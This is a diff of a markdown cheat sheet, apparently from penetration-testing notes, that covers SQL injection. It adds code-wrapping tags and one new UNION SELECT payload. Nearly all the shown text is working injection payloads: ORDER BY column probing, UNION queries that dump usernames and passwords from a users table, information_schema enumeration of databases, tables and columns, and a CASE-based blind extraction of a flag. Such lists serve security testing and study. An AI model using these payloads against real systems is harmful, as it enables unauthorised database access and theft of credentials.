@@ -18,7 +18,8 @@ $SQL = "SELECT * FROM {tablename} WHERE {username} = ' + 1' OR 1+1-- + ' AND ' +
 
 Order by:
 
-```
+{% code overflow="wrap" %}
+```sql
 =1 order by 1
 =1 order by 2
 =1 order by 3
@@ -29,6 +30,7 @@ Until error occurs, then:
 =1 union all select 1, 2, 3...
 =1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
 =1 union all select 1, username, password from users
+santaa_clauz" UNION ALL SELECT 1,2,3,4,@@version#
 
 ' union select 1,2,3,concat(schema_name, ':') from information_schema.schemata-- -    # db name
 ' union select 1,2,3,concat(table_name, ':') from information_schema.tables where table_schema = '[DB_NAME]'-- -   # table name
@@ -36,6 +38,7 @@ Until error occurs, then:
 ' union select 1,2,3,concat(id, ':', name, ':', email, ':', password) from user-- -   # column content
 order by (CASE WHEN (SELECT (SUBSTRING(flag,1,1)) from flag) = 'a' then title else date end) ASC
 ```
+{% endcode %}
 
 ### Simple SQL injection test
 
